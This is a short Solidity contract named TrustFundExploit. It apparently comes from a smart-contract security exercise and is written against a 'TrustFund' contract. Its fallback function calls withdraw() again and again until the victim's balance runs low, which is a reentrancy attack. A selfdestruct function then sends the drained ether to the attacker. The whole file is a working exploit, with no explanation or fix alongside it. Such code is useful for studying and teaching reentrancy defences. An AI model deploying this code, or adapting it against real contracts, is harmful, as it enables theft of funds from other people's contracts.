pragma solidity 0.4.24;

interface TrustFund {
    function withdraw() external;
    function returnFunds() external payable;
}

contract TrustFundExploit {
    
    address public owner;
    address public victim_addr;
    uint8 counter;
    
    TrustFund fund;
    
    constructor(address addr) public {
        owner = msg.sender;
        victim_addr = addr;
        fund = TrustFund(victim_addr);
    }
    
    function () payable external {
        if (address(fund).balance >= msg.value) {
            fund.withdraw();
        }
    }

    function exploit() public {
        fund.withdraw();
    }
    
    function selfdest() public {
        selfdestruct(owner);
    }
}
